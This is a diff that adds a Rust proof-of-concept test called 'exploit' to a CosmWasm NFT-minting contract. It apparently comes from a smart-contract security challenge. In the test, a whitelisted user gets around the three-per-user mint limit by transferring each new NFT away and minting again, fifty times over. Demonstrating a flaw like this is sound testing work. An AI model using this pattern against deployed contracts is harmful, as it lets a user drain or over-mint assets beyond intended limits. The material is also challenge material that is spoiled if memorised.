@@ -140,4 +140,62 @@ pub mod tests {
 
         assert_eq!(config.total_tokens, 4);
     }
+    
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+
+        // query whitelisted users
+        let whitelist: Whitelist = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
+            .unwrap();
+
+        assert!(whitelist.users.contains(&USER1.to_owned()));
+        assert!(whitelist.users.contains(&USER2.to_owned()));
+        assert!(whitelist.users.contains(&USER3.to_owned()));
+
+        let user4 = "user4";
+
+        for _ in 1..51 {
+            // query config
+            let config: Config = app
+                .wrap()
+                .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+                .unwrap();
+
+            // mint to whitelisted user until max limit
+            assert_eq!(config.mint_per_user, 3);
+
+            let token_id = config.total_tokens;
+            // i will mint as many as i want
+            // the mintoooor
+            app.execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::Mint {},
+                &[],
+            ).unwrap();
+
+            // transfer it so we can keep minting
+            app.execute_contract(
+                Addr::unchecked(USER1),
+                config.nft_contract.clone(),
+                &cw721_base::msg::ExecuteMsg::TransferNft::<Empty, Empty> {
+                    recipient: user4.to_string(),
+                    token_id: token_id.to_string(),
+                },
+                &[],
+            ).unwrap();
+        }
+
+        // ensure total tokens increases
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
+            .unwrap();
+
+        assert_eq!(config.total_tokens, 50);
+    }
 }
